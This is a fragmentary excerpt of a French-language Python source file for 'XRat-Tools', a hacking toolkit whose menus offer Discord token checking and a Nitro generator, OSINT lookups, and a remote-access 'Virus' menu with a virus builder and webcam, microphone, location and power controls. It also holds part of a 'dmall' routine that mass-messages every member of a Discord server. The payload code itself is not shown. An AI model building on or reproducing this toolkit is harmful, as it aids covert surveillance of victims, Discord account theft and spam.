...
┌──({hostname}@3.vlt&16_id)-[~Menu -]│
└─$>""")

ascii_ = '''
▀████    ▐████▀    ▄████████    ▄████████     ███     by 3.vlt & 16_id
  ███▌   ████▀    ███    ███   ███    ███ ▀█████████▄ https://discord.gg/PPN5wMqG3F
   ███  ▐███      ███    ███   ███    ███    ▀███▀▀██ 
   ▀███▄███▀     ▄███▄▄▄▄██▀   ███    ███     ███   ▀ 
   ████▀██▄     ▀▀███▀▀▀▀▀   ▀███████████     ███     
  ▐███  ▀███    ▀███████████   ███    ███     ███     
...
def main():
    ...
    if choice == "n" or choice == "N":
        input("[SOON] Le prochain menu arrive bientôt ! ")
        clear.clear()
        main()
...
|    ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝   ╚═╝              |
|                                                          |
|              Created by : 3.vlt & 16_id                  |
|              Project    : XRat-Tools                     |
|              Discord    : discord.gg/PPN5wMqG3F          |
|              Version    : 1.0                            |
+----------------------------------------------------------+
""" + Style.RESET_ALL)
...
├─ [03] Discord Token Info              ├─ [08] Discord Token Checker           ├─ [13] Bientôt...
├─ [04] Discord ID Info                 ├─ [09] Discord Nitro Generator         ├─ [14] Bientôt...
├─ [05] Discord Webhook Info            ├─ [10] Discord Bot ID to Invite        ├─ [15] Sortir du menu Discord

  '''
  coilorat = Colorate.Diagonal(Colors.blue_to_red, ascii_discord)
  anim.reveal_text(coilorat)
  root_discord = (Fore.LIGHTMAGENTA_EX+"""
┌──(User@3.vlt&16_id)-[~DISCORD]│
└─$>""")
    ...
    async def dmall(ctx, *, message):
      ...
      for member in ctx.guild.members:
        ...
        try:
          ...
          blocked += 1
          print(Fore.LIGHTRED_EX+f"Blocked : {member.id} | {member.name} (no mutual guild / DMs closed)")
        except discord.HTTPException as e:
          blocked += 1
          print(Fore.LIGHTRED_EX+f"Failed : {member.id} | {e}")
      await ctx.send(f"Dmall done : {sent} sent, {blocked} blocked.")
    print()
...
├─ [05] GitHub Informations Searcher    ├─ [10] All OSINT Websites              ├─ [15] Sortir du menu Osint

                                                                                      
"""
  COLorss = Colorate.Diagonal(Colors.blue_to_red, ascii_osint)
  anim.reveal_text(COLorss)
  root_osint = (Fore.LIGHTMAGENTA_EX+"""
┌──(User@3.vlt&16_id)-[~OSINT]│
└─$>""")
...
├─ [01] Virus Builder                   ├─ [06] Location                        ├─ [11] Bientôt..
├─ [02] WebCam                          ├─ [07] Notify                          ├─ [12] Bientôt..
├─ [03] Microphone                      ├─ [08] Bientôt..                       ├─ [13] Bientôt..
├─ [04] Monitor                         ├─ [09] Bientôt..                       ├─ [14] Bientôt..
├─ [05] Power                           ├─ [10] Bientôt...                      ├─ [15] Sortir du menu Virus

  '''
  coilorat = Colorate.Diagonal(Colors.blue_to_red, ascii_virus)
  anim.reveal_text(coilorat)
  root_virus = (Fore.LIGHTMAGENTA_EX+"""
┌──(User@3.vlt&16_id)-[~VIRUS]│
└─$>""")
  choicevirus = input(root_virus)
  if choicevirus == "1" or choicevirus == "01":
    virusbuilder()
  if choicevirus == "2" or choicevirus == "02":
    webcam()
  if choicevirus == "3" or choicevirus == "03":
    microphone()
  if choicevirus == "4" or choicevirus == "04":
    monitor()
  if choicevirus == "5" or choicevirus == "05":
    power()
  if choicevirus == "6" or choicevirus == "06":
    location()
  if choicevirus == "7" or choicevirus == "07":
    notify()
  if choicevirus == "8" or choicevirus == "08":
    input("[SOON] Le prochain menu arrive bientôt ! ")
    clear.clear()
    virusmenu()
  if choicevirus == "9" or choicevirus == "09":
    input("[SOON] Le prochain menu arrive bientôt ! ")
    clear.clear()
    virusmenu()
  if choicevirus == "10" or choicevirus == "010":
    input("[SOON] Le prochain menu arrive bientôt ! ")
    clear.clear()
    virusmenu()
  if choicevirus == "11" or choicevirus == "011":
    input("[SOON] Le prochain menu arrive bientôt ! ")
    clear.clear()
    virusmenu()
  if choicevirus == "12" or choicevirus == "012":
    input("[SOON] Le prochain menu arrive bientôt ! ")
    clear.clear()
    virusmenu()
  if choicevirus == "13" or choicevirus == "013":
    input("[SOON] Le prochain menu arrive bientôt ! ")
    clear.clear()
    virusmenu()
  if choicevirus == "14" or choicevirus == "014":
    input("[SOON] Le prochain menu arrive bientôt ! ")
    clear.clear()
    virusmenu()
  if choicevirus == "15" or choicevirus == "015":
    main()
